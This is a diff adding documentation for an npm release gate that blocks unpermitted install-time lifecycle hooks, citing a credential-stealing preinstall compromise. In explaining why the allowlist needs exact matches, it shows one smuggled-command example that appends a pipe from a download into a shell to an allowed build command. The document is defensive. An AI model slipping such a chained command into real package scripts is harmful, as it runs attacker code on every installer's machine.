@@ -449,6 +449,88 @@ This gate runs automatically. No configuration required.
 
 ---
 
+## Lifecycle-script gate (verify-lifecycle-scripts.sh)
+
+Refuses to publish packages whose `preinstall`, `install`, or
+`postinstall` script runs code on every consumer of the package. This is
+the payload mechanism used in the April 2026 `@bitwarden/cli@2026.4.0`
+compromise: a preinstall hook pointing at `bw1.js` / `bw_setup.js`
+executed on every install, stealing GitHub tokens, `.ssh` keys, `.env`
+files, and cloud credentials. A version that already shipped through an
+anvil pipeline with `lifecycle-scripts-policy: strict` would have been
+blocked at this gate.
+
+### How it works
+
+Reads `scripts` from the consumer's `package.json` and compares each of
+the three install-time hooks against an explicit allowlist. Anything
+not on the allowlist warns (default) or fails the release (strict).
+
+Only install-time hooks (those npm runs automatically for every consumer
+of the published package) are inspected. Build-time hooks (`prepare`,
+`prepack`, `prepublishOnly`) run on the publisher's machine at pack
+time, not on consumers, and are deliberately out of scope for this
+gate.
+
+### Configuration
+
+Two inputs:
+
+- `lifecycle-scripts-policy` (default: `warn`): one of `warn`, `strict`,
+  `off`. Warn logs unpermitted hooks but lets the release proceed.
+  Strict fails the release. Off skips the gate entirely.
+- `allowed-lifecycle-scripts` (default: `{}`): JSON object mapping hook
+  name to the exact command string permitted. Exact string match only —
+  substring and prefix matches are intentionally not supported, because
+  they would let an attacker smuggle extra commands past an allowlisted
+  entry (e.g. `node-gyp rebuild; curl evil | sh`).
+
+Default behaviour is warn-only so adopting anvil does not break
+existing releases of packages that already ship a legitimate
+`postinstall`. Promote to strict once the allowlist is populated:
+
+```yaml
+uses: forgesworn/anvil/.github/workflows/release.yml@v0
+with:
+  lifecycle-scripts-policy: strict
+  allowed-lifecycle-scripts: '{"postinstall": "node-gyp rebuild"}'
+```
+
+Most pure-JS libraries have no legitimate install hooks at all; the
+`{}` default combined with `lifecycle-scripts-policy: strict` is the
+correct setting for those, and it is the configuration this gate was
+designed for.
+
+### Output
+
+- On success: `ok: no preinstall/install/postinstall hooks declared` or
+  `ok: all install hooks present are on the allowlist`.
+- In warn mode on offending hooks: `warning: preinstall hook set in
+  package.json: <cmd>` per hook, then a reminder that strict mode
+  would fail.
+- In strict mode on offending hooks: the same warnings, then `error:
+  lifecycle-scripts-policy=strict: refusing to publish package with
+  unpermitted install hooks`. Exit 1, release blocked.
+- On an allowlisted-hook-with-wrong-command: `warning: postinstall
+  mismatch: package.json has '<cmd>' but allowlist expects '<expected>'`.
+
+### What it does not catch
+
+- Malicious code loaded from the package's main entry (`require`/
+  `import` side effects that run on first use).
+- Malicious native-module bindings invoked on import.
+- Anything inside a bundled runtime shipped with the package.
+- Build-time hooks (`prepare`, `prepack`) — the publisher-side
+  attack surface, covered by the action's own job isolation rather
+  than by this gate.
+
+The gate is a targeted block on the *specific* shape used in the April
+2026 Bitwarden compromise, not a general malicious-code detector. It
+pairs with OIDC trusted publishing (which removes the long-lived
+`NPM_TOKEN` pivot) to close that campaign's attack chain end-to-end.
+
+---
+
 ## Frozen-vector gate (verify-vectors.sh)
 
 An optional gate for libraries with deterministic test vectors
